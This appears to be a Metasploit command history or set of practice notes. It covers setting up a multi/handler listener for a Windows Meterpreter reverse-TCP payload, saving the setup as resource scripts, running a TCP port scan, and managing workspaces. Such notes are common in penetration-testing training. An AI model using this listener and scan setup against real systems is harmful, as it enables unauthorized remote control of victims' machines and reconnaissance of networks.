	ls -al /usr/share/metasploit-framework/scripts/resource/
	nano /usr/share/metasploit-framework/scripts/resource/auto_brute.rc
	cd Windows_Payloads/
	ls
	msfconsole
	use multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST ip
	set LPORT 1234
	exploit
	nano handler.rc
	use multi/handler
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST ip
	set LPORT 1234
	exploit
	msfconsole -r handler.rc 
	msfconsole
	search portscan
	use auxiliary/scanner/portscan/tcp
	show options
	use auxiliary/scanner/portscan/tcp
	set RHOSTS ip
	exploit
	msfconsole -r portscan.rc
	nano db_status.rc (db_status, workspace, workspace -a test)
	msfconsole -r db_status.rc
	workspace -d test
	exit
	msfconsole
	resource ~/Desktop/Windows_Payloads/handler.rc
	